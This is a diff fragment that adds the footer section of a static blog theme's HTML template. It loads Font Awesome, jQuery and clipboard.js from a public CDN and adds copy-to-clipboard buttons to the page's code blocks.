+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
